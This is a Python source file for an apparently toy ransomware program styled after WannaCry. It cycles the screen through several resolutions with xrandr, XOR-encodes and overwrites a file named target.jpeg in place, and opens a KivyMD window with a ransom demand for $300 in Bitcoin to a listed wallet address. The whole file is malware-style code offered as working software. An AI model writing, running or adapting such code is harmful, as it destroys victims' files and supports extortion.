#!/usr/bin/python3
from kivy.lang import Builder
from kivy.uix.boxlayout import BoxLayout
from kivymd.app import MDApp
from kivymd.uix.label import MDLabel
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.dialog import MDDialog
import subprocess
import time

# KV language string defining the GUI layout
Builder.load_string('''
<MainWindow>:
    orientation: 'vertical'
    spacing: '10dp'
    
    MDLabel:
        text: 'Your files are encrypted!'
        halign: 'center'
        font_style: 'H5'
        theme_text_color: 'Secondary'
        
    MDLabel:
        text: 'To decrypt, pay $300 in Bitcoin to the following address:'
        halign: 'center'
        font_style: 'Body1'
        theme_text_color: 'Primary'
        
    MDLabel:
        text: '1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX'
        halign: 'center'
        font_style: 'Body1'
        theme_text_color: 'Primary'
        
    MDRaisedButton:
        text: 'Pay Bitcoin'
        pos_hint: {'center_x': 0.5}
        on_press: root.show_dialog()
''')

# Main application class
class MainWindow(BoxLayout):
    def show_dialog(self):
        dialog = MDDialog(
            title="Payment Instructions",
            text="Send $300 in Bitcoin to the address:\n\n1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX",
            buttons=[
                MDRaisedButton(
                    text="Close", on_release=lambda *args: dialog.dismiss()
                )
            ],
        )
        dialog.open()

# KivyMD App class
class WannaCryApp(MDApp):
    def build(self):
        return MainWindow()



def get_current_resolution():
    cmd = "xrandr | grep '*' | awk '{print $1}'"
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        return result.stdout.strip()
    else:
        return None

def change_resolution(new_resolution):
    cmd = f"xrandr --output $(xrandr | grep ' connected' | awk '{{print $1}}') --mode {new_resolution}"
    subprocess.run(cmd, shell=True)

original_resolution = get_current_resolution()

def mal_func():
    if original_resolution:
        try:
            resolutions = ["1680x1050","1440x900","1280x800","1280x720","640x480", original_resolution]
            for resolution in resolutions:
                change_resolution(resolution)
                # print(f"Changed resolution to {resolution}")
                time.sleep(2) 

            # print("Resolution changed and restored.")
        except Exception as e:
            print(f"Error: {e}")
    else:
        print("Failed to get current resolution.")

def binary_to_text(binary_string):
    binary_values = binary_string.split()
    text_result = ''.join(chr(int(bin_val, 2)) for bin_val in binary_values)
    return text_result

def string_to_binary(input_string):
    binary_representation = ' '.join(format(ord(char), '08b') for char in input_string)
    #print("These are binary represent.",binary_representation)
    return binary_representation

def xor_binary_strings(binary_str1, binary_str2):
    result = ''
    for bit1, bit2 in zip(binary_str1, binary_str2):
        #print(bit1,bit2)
        result += '1' if bit1 != bit2 else '0'
        #print("result is",result)
    return result

def encode(s,key):
    if key == "":
        key = 10 #Default Key
        print("No Key is given, hence default key - 10 is being used")

    key = int(key)
    print("key is:",key)

    # Converting text and key into binary
    text_binary = string_to_binary(s)
    key_binary = format(key, '08b')
    print("key_bin is:",key_binary)

    result_fina = []
    # XOR each binary letter with the key separately
    for char in text_binary.split():
        result_binary = ''.join(xor_binary_strings(char, key_binary))
        result_fina.append(result_binary)
    
    result_fina = ' '.join(result_fina)
    print("Result after XOR:", result_fina)

    b2t = binary_to_text(result_fina)
    print("Result after binary to text conversion is :", b2t)
    return(b2t)

def corrupt():
    file = str(open("target.jpeg","rb").read())
    data = encode(file[2:-1],"69")
    newf = open("target.jpeg","w")
    newf.write(data)
    newf.close()
    

# Entry point of the application
if __name__ == '__main__':
    mal_func()
    corrupt()
    WannaCryApp().run()
    